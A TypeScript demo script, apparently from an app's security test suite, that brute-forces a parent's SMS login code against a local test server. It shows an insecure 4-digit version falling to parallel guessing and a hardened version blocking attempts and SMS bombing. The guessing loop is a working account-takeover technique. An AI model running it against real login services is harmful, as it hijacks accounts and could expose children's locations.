// Scenario: account takeover. The attacker knows a parent's phone number, asks for an SMS
// code and tries to guess it to log in as the parent (and see the children's live location).
import { header, row, startTarget } from "./lib.ts";

header("SMS login code brute force", "Take over a parent's account by guessing the one-time login code.");

for (const insecure of [true, false]) {
  const t = await startTarget(insecure);
  const victim = await t.login(); // the account exists
  const ch = await t.call("POST", "/api/auth/otp/request", { phone: victim.phone });
  const digits = insecure ? 4 : 6;
  const space = 10 ** digits;
  let tries = 0, token: string | null = null, stoppedBy = "";
  const errors: Record<string, number> = {};
  const started = Date.now();
  for (let start = 0; start < space && !token && !stoppedBy; start += 50) {
    const guesses = Array.from({ length: Math.min(50, space - start) }, (_, i) => String(start + i).padStart(digits, "0"));
    const rs = await Promise.all(guesses.map((g) => t.call("POST", "/api/auth/otp/verify", { phone: victim.phone, challengeId: ch.body.challengeId, code: g })));
    for (const r of rs) {
      tries++;
      if (r.status === 200) { token = r.body.token; break; }
      errors[r.body?.error] = (errors[r.body?.error] || 0) + 1;
      if (r.body?.error === "too_many_attempts" || r.body?.error === "invalid_or_expired") stoppedBy = r.body.error;
    }
  }
  console.log(`\n  ${insecure ? "v0 (insecure): 4-digit SMS code, unlimited tries" : "v1 (secure): 6-digit code, burned after 5 wrong tries"}`);
  row("Guesses sent", String(tries));
  row("Time", `${((Date.now() - started) / 1000).toFixed(1)} s`);
  row("Result", token ? "ACCOUNT TAKEN OVER, attacker has a valid session" : "BLOCKED");
  if (!token) row("API answers", Object.entries(errors).map(([k, v]) => `${k} x${v}`).join(", "));
  if (!insecure) {
    const bomb: number[] = [];
    for (let i = 0; i < 5; i++) bomb.push((await t.call("POST", "/api/auth/otp/request", { phone: victim.phone })).status);
    row("New codes, same phone", bomb.join(", ") + "  (429 = SMS bombing stopped)");
  }
  await t.close();
}
